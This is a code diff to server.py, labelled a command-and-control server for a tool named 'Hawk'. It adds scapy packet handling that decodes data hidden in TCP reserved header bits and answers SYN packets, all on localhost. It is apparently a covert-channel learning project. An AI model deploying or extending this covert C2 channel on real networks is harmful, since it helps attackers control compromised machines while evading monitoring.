@@ -6,9 +6,9 @@
 # server.py
 # C2 Server for Hawk
 
-from scapy.all import sniff, TCP
+from scapy.all import sniff, TCP, IP, send
 from textwrap import wrap
-# TODO implement server side
+import lib
 
 MSG_RAW = [""]
 packet_counter = 0
@@ -67,6 +67,11 @@ def convert(input):
     elif input == 7:
         return "111"
 
+def wrap_ip(payload):
+    # wrap TCP packet in IP packet
+    ip_pkt = IP(src="127.0.0.1",dst="127.0.0.1")
+    return ip_pkt/payload
+
 def handle_packet(packet):
     # listen for packets, and handle data
     global MSG_RAW
@@ -79,11 +84,17 @@ def handle_packet(packet):
             if packet[TCP].flags == "F":
                 #print("F", MSG_RAW)
                 parse(MSG_RAW[0])
-            #print(f"Received TCP packet on port 9999: {packet.summary()}")
-            #print("msg", packet[TCP].reserved)
-            #print("str", convert(packet[TCP].reserved))
-            MSG_RAW[0] += convert(packet[TCP].reserved)
-        
+            elif packet[TCP].flags == "PA":
+                MSG_RAW[0] += convert(packet[TCP].reserved)
+            elif packet[TCP].flags == "S":
+                # three way handshake
+                payload = lib.create_synack()
+                pkt = wrap_ip(payload)
+                send(pkt)
+            elif packet[TCP].flags == "SA":
+                #three way handshake
+                pass
+
 
 
 def main():
